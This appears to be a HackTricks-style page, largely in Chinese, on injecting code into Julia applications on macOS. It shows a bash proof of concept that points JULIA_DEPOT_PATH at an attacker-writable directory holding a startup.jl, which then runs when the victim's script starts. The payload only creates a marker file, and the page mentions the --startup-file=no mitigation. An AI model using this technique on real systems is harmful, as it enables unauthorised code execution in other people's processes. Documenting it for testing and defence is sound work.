# macOS Julia Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## `JULIA_DEPOT_PATH` 和 `startup.jl`

Julia 通常会在启动时从其第一个 depot 执行 `config/startup.jl`。`JULIA_DEPOT_PATH` 控制 depot 列表，因此将其指向攻击者可写的目录树，就能重定向自动加载的 startup file。<sup>[[1]](#references)[[2]](#references)</sup>
```bash
mkdir -p /tmp/julia-depot/config
echo 'run(`touch /tmp/julia-startup-executed`)' >/tmp/julia-depot/config/startup.jl

# A trailing empty entry expands to Julia's default depots.
JULIA_DEPOT_PATH=/tmp/julia-depot: julia victim.jl
```
末尾分隔符在受害者仍需要其正常 packages 时很有用。`julia --startup-file=no` 会禁用此 startup file。启动前清除该变量，因为它还控制 package registries、environments、caches 和 code-loading locations。

## References

- [1] [Julia 命令行界面：Startup file](https://docs.julialang.org/en/v1/manual/command-line-interface/#Startup-file)
- [2] [Julia 环境变量：`JULIA_DEPOT_PATH`](https://docs.julialang.org/en/v1/manual/environment-variables/#JULIA_DEPOT_PATH)
{{#include ../../../banners/hacktricks-training.md}}
